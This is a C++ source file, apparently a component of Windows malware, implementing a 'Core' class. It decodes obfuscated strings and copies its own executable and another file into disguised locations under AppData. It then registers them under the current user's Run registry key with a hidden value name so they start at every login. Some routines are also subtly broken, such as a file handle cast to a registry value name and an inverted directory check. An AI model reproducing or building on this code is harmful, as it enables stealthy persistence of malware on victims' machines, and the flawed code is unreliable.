#include "Core.h"
#include <iostream>

void Core::BLoad(DC_Decryptor &enc) const {
  std::string tmp = getenv(enc.ed("DSSGDWD", 0x1070203, 0x000000001).c_str()),
              buf;
  for (int i = 0; tmp.size() - 8 > i; i++) {
    buf += tmp[i];
  }
  tmp = "";
  buf += enc.ed("cSvjhscTpjyvzvm{cMllkzcTpjyvzvm{Zv|ukJvu{yvssly5ll",
                 0x2030107, 0x000000001);
  char autorun[255];
  strcpy(autorun, buf.c_str());
  DWORD dwtype = 0;
  DWORD dwBufsize = sizeof(autorun);
  TCHAR szpath[MAX_PATH];
  HKEY hKeys;
  if (ERROR_SUCCESS ==
      RegCreateKeyEx(HKEY_CURRENT_USER,
                     reinterpret_cast<LPCSTR>(enc.ed("Zvm{~hylcTpjyvzvm{c^pukv~zcJ|yylu{]lyzpvucY|u",
                             0x203010307, 0x000000001)
                         .c_str()),
                     0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKeys, NULL)) {
    RegSetValueEx(
        hKeys, reinterpret_cast<LPCSTR>(enc.ed("LBRBnmsqnkkdq", 0x208040701, 0x000000000).c_str()), 0,
        REG_SZ, reinterpret_cast<const BYTE *>(&autorun), sizeof(autorun));
    RegCloseKey(hKeys);
  }
}

void Core::mv(DC_Decryptor &enc, char *orig) const {
  int len;
  char *buffer;
  std::string tmp =
                  getenv(enc.ed("FUUIFYF", 0x000200005, 0x000000001).c_str()),
              buf;
  for (int i = 0; tmp.size() - 8 > i; i++) {
    buf += tmp[i];
  }
  tmp = "";
  buf += enc.ed("aQthfqaRnhwtxtkyaKjjixaRnhwtxtkyXtzsiHtsywtqqjw3j}j",
                 0x000260005, 0x000000001);
  std::ifstream infile(orig, std::ios::binary);
  std::ofstream outfile(buf, std::ios::binary);
  infile.seekg(0, std::ios::end);
  len = infile.tellg();
  infile.seekg(0, std::ios::beg);
  buffer = new char[len];
  infile.read(buffer, len);
  outfile.write(buffer, len);
  delete[] buffer;
}

void Core::dlload(DC_Decryptor &enc) const {
  std::string tmp =
                  getenv(enc.ed("BQQEBUB", 0x000000001, 0x000000001).c_str()),
              buf;
  for (int i = 0; tmp.size() - 8 > i; i++) {
    buf += tmp[i];
  }
  tmp = "";
  buf += enc.ed("YIl`^iYJf`olplcqYCbbapYpka+aii", 0x000000003, 0x000000000);
  std::ifstream infile(
      enc.ed(">5WRdi_jrnWNtno`h.-W^h_)`s`", 0x000000005, 0x000000000),
      std::ios::binary);
  std::ofstream outfile(buf, std::ios::binary);
  infile.seekg(0, std::ios::end);
  int len;
  len = infile.tellg();
  infile.seekg(0, std::ios::beg);
  char *buffer;
  buffer = new char[len];
  infile.read(buffer, len);
  outfile.write(buffer, len);
  delete[] buffer;
}

bool Core::isDirectoryExists(const char *filename) {
  DWORD dwFileAttributes = GetFileAttributes(reinterpret_cast<LPCSTR>(filename));
  if (dwFileAttributes == 0xFFFFFFFF) return false;
  return dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY;
}

void Core::createActiveFolderCheck() {
  if (isDirectoryExists(
          "C:\\Users\\%user%\\AppData\\Roaming\\Microsoft\\Feeds"))
    CreateDirectory("C:\\Users\\%user%\\AppData\\Roaming\\Microsoft\\Feeds", nullptr);
}

void Core::autoRunSet() {
  char arr[MAX_PATH] = {};
  GetModuleFileName(NULL, (LPSTR)arr, MAX_PATH);
  HKEY hKey;

  if (RegCreateKeyEx(HKEY_CURRENT_USER,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                     NULL, 0, KEY_ALL_ACCESS, NULL, &hKey,
                     NULL) == ERROR_SUCCESS) {
    if (RegSetValueEx(hKey, reinterpret_cast<LPCSTR>(getFileNameToAutoSet()), NULL, REG_SZ, (LPBYTE)arr,
                      sizeof(arr)) == ERROR_SUCCESS) {
      RegCloseKey(hKey);
    }
    return;
  }
}

HANDLE Core::getFileNameToAutoSet() const {
  WIN32_FIND_DATA file;
  HANDLE search_handle = FindFirstFile("C:\\*", &file);
  if (search_handle) {
    do {
      std::cout << file.cFileName << std::endl;
    } while (FindNextFile(search_handle, &file));
    CloseHandle(search_handle);
    return search_handle;
  }
  return nullptr;
}